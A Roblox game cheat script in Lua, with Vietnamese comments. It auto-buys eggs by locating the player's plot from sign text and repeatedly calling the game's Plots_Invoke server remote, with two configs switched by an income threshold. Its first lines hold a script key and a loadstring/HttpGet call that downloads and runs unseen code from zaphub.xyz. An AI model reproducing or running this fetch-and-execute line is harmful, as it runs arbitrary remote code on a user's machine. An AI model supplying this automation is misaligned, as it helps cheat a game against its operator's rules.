script_key="TdVwhWpohFRGWfEVbDSwgRifLiopOLOG";
loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
wait(5)
-- ==============================================================
-- 2 CONFIG & AUTO-SWITCH THEO AMOUNT TRÊN SIGN + RECHECK ĐỊNH KỲ
-- ==============================================================

-- #########################
-- CONFIG 1 (mặc định)
-- #########################
local CONFIG1 = {
    NAME = "Config 1 (mặc định)",
    PRINT_VERBOSE = true,
    DELAY_BETWEEN_SCAN_CALLS = 0.1,
    STOP_ON_FIRST_FOUND = false,        -- để bật recheck / switch liên tục, đặt false
    RECHECK_PLOT_EVERY = 600,
    EGGS = {
        [1] = { delay = 0.1,    enabled = true  }, 
        [2] = { delay = 60,     enabled = true  }, 
        [3] = { delay = 200,   enabled = true  }, 
        [4] = { delay = 350,   enabled = true  }, 
        [5] = { delay = 800,   enabled = true  }, 
    }
}

-- #########################
-- CONFIG 2 (khi amount >= 10k/s)
-- #########################
local CONFIG2 = {
    NAME = "Config 2 (amount >= 10k/s)",
    PRINT_VERBOSE = true,
    DELAY_BETWEEN_SCAN_CALLS = 0.1,
    STOP_ON_FIRST_FOUND = false,
    RECHECK_PLOT_EVERY = 600,
    EGGS = {
        [1] = { delay = 0.1, enabled = true },
        [2] = { delay = 0.1, enabled = true },
        [3] = { delay = 0.1, enabled = true },
        [4] = { delay = 600, enabled = false },
        [5] = { delay = 1000, enabled = false },
    }
}

-- Ngưỡng để chuyển sang config 2 (10k = 10000)
local THRESHOLD_AMOUNT = 10000

-- Khoảng thời gian kiểm tra lại thông tin trên sign (giây)
local SIGN_RECHECK_INTERVAL = 20    -- chỉnh ở đây nếu muốn (mặc định 30s)

-- ==============================================================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local PlotsFolder = workspace:WaitForChild("__THINGS"):WaitForChild("Plots")
local Plots_Invoke = ReplicatedStorage:WaitForChild("Network"):WaitForChild("Plots_Invoke")
local LocalPlayer = Players.LocalPlayer

-- Helper: parse số có hậu tố (k,m,b) và các dạng có dấu phẩy / spaces
local function parseNumberWithSuffix(s)
    if not s then return nil end
    local str = tostring(s):lower()
    str = str:match("^%s*(.-)%s*$") or str
    local clean = str:gsub(",", ""):gsub("%s+", " ")

    local num, suffix = clean:match("([%d%.]+)%s*([kmb])")
    if num and suffix then
        local n = tonumber(num)
        if not n then return nil end
        if suffix == "k" then return n * 1e3 end
        if suffix == "m" then return n * 1e6 end
        if suffix == "b" then return n * 1e9 end
    end

    local plain = clean:match("([%d%.]+)")
    if plain then
        local n = tonumber(plain)
        return n
    end

    return nil
end

-- extract amount từ chữ (hỗ trợ 10k/s, 10k sec, Amount: 10k, 10,000, ...)
local function extractAmountFromText(txt)
    if not txt then return nil end
    local lower = tostring(txt):lower()

    local a = lower:match("([%d%.,]+%s*[kmb]?)%s*/%s*s")
    if a then return parseNumberWithSuffix(a) end

    a = lower:match("([%d%.,]+%s*[kmb]?)%s*per%s*sec")
    if a then return parseNumberWithSuffix(a) end

    a = lower:match("([%d%.,]+%s*[kmb]?)%s*cand?y")
    if a then return parseNumberWithSuffix(a) end

    a = lower:match("amount[:%s]*([%d%.,]+%s*[kmb]?)")
    if a then return parseNumberWithSuffix(a) end

    a = lower:match("([%d%.,]+%s*[kmb]?)")
    if a then return parseNumberWithSuffix(a) end

    return nil
end

-- Tìm plot của player bằng Sign, trả về plot object và amount (number) đọc được từ sign (nếu có)
local function findMyPlotAndAmount()
    for _, plot in ipairs(PlotsFolder:GetChildren()) do
        local sign = plot:FindFirstChild("Build") and plot.Build:FindFirstChild("Sign")
        if sign then
            local texts = {}
            for _, g in ipairs(sign:GetDescendants()) do
                if g:IsA("TextLabel") or g:IsA("TextBox") or g:IsA("TextButton") then
                    if g.Text and g.Text ~= "" then
                        table.insert(texts, {source = g:GetFullName(), text = g.Text})
                    end
                end
            end

            local containsName = false
            for _, t in ipairs(texts) do
                if tostring(t.text):lower():find(LocalPlayer.Name:lower(), 1, true) then
                    containsName = true
                    break
                end
            end

            if containsName then
                local foundAmount = nil
                for _, t in ipairs(texts) do
                    local amt = extractAmountFromText(t.text)
                    if amt and type(amt) == "number" then
                        foundAmount = amt
                        break
                    end
                end

                -- debug print
                print("✅ Tìm thấy plot của bạn:", plot.Name)
                print("📜 Nội dung Text trên Sign:")
                for _, t in ipairs(texts) do
                    print("   ➜", t.source, "=", t.text)
                end

                if foundAmount then
                    print(("🍬 Amount đọc được trên sign: %s"):format(tostring(foundAmount)))
                else
                    print("🍬 Không tìm thấy amount hợp lệ trên sign.")
                end

                return plot, foundAmount
            end
        end
    end
    return nil, nil
end

-- get plot id number (ID attr or PlotID or tonumber(name))
local function getPlotIdNumber(plot)
    if not plot then return nil end
    local plotId = plot:GetAttribute("ID") or plot:GetAttribute("PlotID") or tonumber(plot.Name) or plot.Name
    return tonumber(plotId) or plotId
end

-- VALID RESPONSE helper
local function isValidResponse(res, ok)
    return ok and res ~= nil and res ~= false
end

-- THREAD MANAGEMENT
-- mỗi thread sẽ có một controller { stopFlag = false, thread = task }
local activeThreads = {}  -- mapping eggSlot -> controller

local function stopAllThreads()
    for slot, ctrl in pairs(activeThreads) do
        if ctrl and ctrl.stopFlag ~= nil then
            ctrl.stopFlag = true
        end
    end
    -- optionally wait a bit to let threads exit
    task.wait(0.15)
    activeThreads = {}
end

-- start egg thread but return controller
local function startEggThreadControlled(plotId, eggSlot, delay, printVerbose)
    local controller = { stopFlag = false }
    activeThreads[eggSlot] = controller

    task.spawn(function()
        if printVerbose then
            print(("🐣 [Thread] Bắt đầu spam trứng #%d mỗi %ss tại plot %s"):format(eggSlot, tostring(delay), tostring(plotId)))
        end

        while not controller.stopFlag do
            local args = { plotId, "PurchaseEgg", eggSlot, 3 }
            local ok, res = pcall(function()
                return Plots_Invoke:InvokeServer(unpack(args))
            end)

            if ok then
                if printVerbose then
                    print(("✅ Mua thành công trứng #%d (resp=%s)"):format(eggSlot, tostring(res)))
                end
            else
                warn(("⚠️ Lỗi khi mua trứng #%d -> %s"):format(eggSlot, tostring(res)))
            end

            -- nếu stopFlag bật giữa chừng thì thoát sớm
            local t = 0
            while t < delay and not controller.stopFlag do
                local step = math.min(1, delay - t)  -- sleep chunks để phản hồi stopFlag nhanh hơn
                task.wait(step)
                t = t + step
            end
        end

        if printVerbose then
            print(("🛑 [Thread] Dừng thread trứng #%d"):format(eggSlot))
        end
    end)

    return controller
end

-- Start threads theo config đã chọn (stop trước đó nếu cần)
local function startThreadsForConfig(chosenConfig, plotId)
    if not chosenConfig then return end
    stopAllThreads()

    for eggSlot, info in pairs(chosenConfig.EGGS) do
        if info.enabled then
            startEggThreadControlled(plotId, eggSlot, info.delay, chosenConfig.PRINT_VERBOSE)
            task.wait(0.08)
        else
            if chosenConfig.PRINT_VERBOSE then
                print(("⏸️ Trứng #%d tắt trong %s"):format(eggSlot, chosenConfig.NAME))
            end
        end
    end
end

-- MAIN: dò sign, start config, re-check sign theo interval để switch config nếu cần
task.spawn(function()
    local currentConfig = nil
    local currentPlot = nil
    local currentAmount = nil

    while true do
        -- tìm plot & amount
        local plot, amount = findMyPlotAndAmount()

        if not plot then
            print("⏳ Chưa tìm thấy plot của bạn. Thử lại sau " .. tostring(CONFIG1.RECHECK_PLOT_EVERY) .. "s.")
            stopAllThreads() -- dừng mọi thread nếu trước đó chạy
            currentConfig = nil
            currentPlot = nil
            currentAmount = nil
            task.wait(CONFIG1.RECHECK_PLOT_EVERY)
        else
            local plotIdNum = getPlotIdNumber(plot)

            -- quyết định config theo amount
            local chosen = CONFIG1
            if amount and type(amount) == "number" and amount >= THRESHOLD_AMOUNT then
                chosen = CONFIG2
            end

            -- nếu config khác config hiện tại hay plot khác -> restart threads với config mới
            local needRestart = false
            if currentConfig == nil or currentPlot ~= plot or currentConfig.NAME ~= chosen.NAME then
                needRestart = true
            end

            if needRestart then
                print(("⚙️ Chuyển sang cấu hình: %s (amount=%s)"):format(chosen.NAME, tostring(amount)))
                startThreadsForConfig(chosen, plotIdNum)
                currentConfig = chosen
                currentPlot = plot
                currentAmount = amount
            else
                -- cùng config, chỉ in log nếu verbose
                if currentConfig and currentConfig.PRINT_VERBOSE then
                    print(("ℹ️ Không thay đổi config (%s). Amount hiện tại = %s"):format(currentConfig.NAME, tostring(amount)))
                end
            end

            -- chờ SIGN_RECHECK_INTERVAL trước khi kiểm tra lại sign để có thể đổi config
            local waited = 0
            while waited < SIGN_RECHECK_INTERVAL do
                task.wait(1)
                waited = waited + 1
                -- nếu plot bị mất giữa lúc đợi thì break để re-scan ngay
                if not plot.Parent then
                    print("⚠️ Plot không còn tồn tại, sẽ re-scan ngay.")
                    break
                end
            end

            -- tiếp vòng while để re-scan sign ngay
        end
    end
end)
